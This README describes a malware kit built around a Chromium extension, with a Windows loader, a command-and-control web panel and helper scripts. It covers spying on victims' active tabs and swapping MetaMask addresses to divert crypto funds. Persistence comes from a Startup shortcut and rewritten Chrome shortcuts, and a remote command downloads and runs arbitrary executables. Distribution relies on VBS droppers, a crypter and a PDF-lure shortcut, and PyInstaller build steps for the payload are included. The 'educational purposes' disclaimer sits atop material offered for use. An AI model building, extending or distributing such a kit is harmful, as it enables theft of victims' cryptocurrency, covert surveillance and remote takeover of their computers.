# Chromium Extension C2 Suite

> **Chromium extension, a separate C2 with a web panel for it.  
> Loader for the extension that works with the separate C2 + web panel,  
> and can also work *without* the extension by executing commands and locking into the system.**

---

## Components

1. **extension** – browser extension itself  
2. **loader** – installer/agent that deploys the extension and executes commands  
3. **loaderPanel** – server + web panel that control the loader  
4. **scrypt** – additional utilities  
5. **server** – server + web panel that control the extension  

> *Each directory above has its own `README.md` describing the internals.*

---

## Extension Server (server/)

### Authorization Data

- login: admin
- pass : password

### Device Tracker

Displays statistics of connected devices:

* **Status** online / offline
* **Identifier** device tag
* **URL** of the active tab
* **Title** of the active tab
* **Timestamp**

### MetaMask Override

1. Specify 10 preset swap values in configmeta.json.
2. Successful swaps are logged in a table showing:

   * Device **Status**
   * **Override Address** (spoofed destination)
   * **Timestamp**

### Extension Panel

* Real-time **randomizer** output(shown to the user whether or not it was swapped
* Enter preset values **by groups**
* View **history** of randomizer swaps
* See the **last generated number**

### Settings

Change the panels login/password stored in configpass.json.

---

##  Loader Build / C2 Loader (loader/)

### Installer Commands

* `restart_chrome` — Restart Chrome on the victim
* `update_extension` — Load a new extension, remove the old one
* `delete` — Remove itself and all temp data completely
* `load_and_run` — Download any file and execute it

### Auth Credentials

```text
login : admin
password: admin
```

### MongoDB (data storage)

| Section           | Features                                                                                                               |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **Home**          | Filter *Online / Offline*, search by **Device ID**<br>Send commands to a specific device<br>View device list & history |
| **Configuration** | Edit **Url Lock** / **Url Unlock** for Xlock page                                                                      |

---

## 🪟 Build Windows – `loadWin` (x64)

* Uses `winshell`, `shutil`
* Creates **autorun** shortcut in *Startup*
* Restarts Chrome via `.bat`
* Recursively finds every Chrome shortcut and overwrites it
* Works with temp files in `%TEMP%`

> *Built-in obfuscator is planned but not finalized.*

### Build Steps

```bash
# 1 – Install PyInstaller
pip install pyinstaller

# 2 – Build executable
pyinstaller --onefile --add-data "extension;extension" loadwin.py
```

* `--add-data "extension;extension"` embeds the **extension** directory.
* Output: `dist/loadwin.exe`
* **Install all dependencies first!**

### File Variants

| Script         | Purpose                                                                |
| -------------- | ---------------------------------------------------------------------- |
| `loadwin.py`   | Full version: installs in system, loads extension, awaits all commands |
| `loader.py`    | Installs extension **only** and handles `restart_chrome`               |
| `load.py`      | Same as `loadwin.py` *except* no persistence on disk                   |
| *Sample build* | See `scrypt/exe/`                                                      |

> **Requires admin rights** for stability – runs, but unreliably, without them.

### Runtime Functionality

1. **First run:** copies extension to `%APPDATA%\.hidden_extension\extension` if absent.
2. Adds shortcut to *Startup* (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`).
3. Locates every `Chrome.lnk` and adds `--load-extension="…"` to the target.
4. Kills *all* Chrome processes, waits 3 min, re-launches Chrome via temp `.bat`.
5. Polls the server every **30 s** for commands:

   * `restart_chrome` — update shortcuts & restart
   * `load_and_run` — download `.exe` to temp & run
   * `update_extension` — download `.zip`, replace extension, restart
   * `delete` — remove extension, autostart shortcut, and the agent itself
6. `delete` also kills Chrome and wipes the hidden extension folder.

---

## Quick Start (LoaderPanel)

```
Init Node project
npm init -y

Install npm-check globally
npm install -g npm-check

Install missing deps
npm-check --install

Verify
npm-check --install

Run
npm start
Panel URL
http://localhost/
```

Uses **MongoDB** – recommended GUI: *MongoDB Compass*.

---

## Full Pack Scripts (scrypt/)

| Folder      | Description                                                                |
| ----------- | -------------------------------------------------------------------------- |
| `Cvbs`      | VBS mods that download & run `install.vbs` on various Windows versions     |
| `DropDemo`  | Demo crypter for `load.exe`                                                |
| `exe`       | Pre-built `load.exe` (Python + extension packed)                           |
| `lnk`       | Auto-creates a shortcut that opens a PDF *and* runs `install.vbs` silently |
| `loadermac` | macOS installer (demo, WIP, requires admin password)                       |

---

## Disclaimer

> This repository is provided for **educational purposes only** and intended for **authorized security research**.
> **Unauthorized or illegal use is strictly prohibited.**


